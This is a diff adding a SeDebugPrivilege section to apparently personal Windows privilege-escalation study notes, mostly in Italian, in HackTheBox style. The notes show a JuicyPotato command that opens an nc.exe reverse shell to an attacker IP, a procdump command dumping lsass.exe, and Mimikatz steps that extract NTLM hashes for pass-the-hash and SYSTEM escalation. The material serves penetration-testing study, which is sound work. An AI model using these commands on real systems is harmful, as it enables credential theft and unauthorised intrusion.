@@ -235,3 +235,21 @@ Exploiting juicy potato con una shell su mssql usando mssqlclient.py from the Im
 
 `SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`
 
+# SeDebugPrivilege
+
+di default sono gli amministratori hanno questo privilegio ma viene assegnato a chiunque deve debuggare o fare troubleshooting.
+
+possiamo usarlo per usare ProcDump e dumpare memoria di processi. Un processo molto utile da cui dumpare memoria e' lsass.exe che contiene le credenziali.
+
+`C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp`.
+
+This is successful, and we can load this in Mimikatz using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).
+
+Se abbiamo RDP possiamo dumparci la memoria a mano da **Task Manager > clicca sul processo > create dump file**.
+
+Con SeDebugPrivilege si puo' anche prendere una **RCE** come SYSTEM(https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1).
+
+con 612 PID di winlogon.exe che abbiamo ricavato con tasklist
+![image](https://github.com/user-attachments/assets/acede22f-b517-40fe-b5a3-300b2a081c6f)
+
+
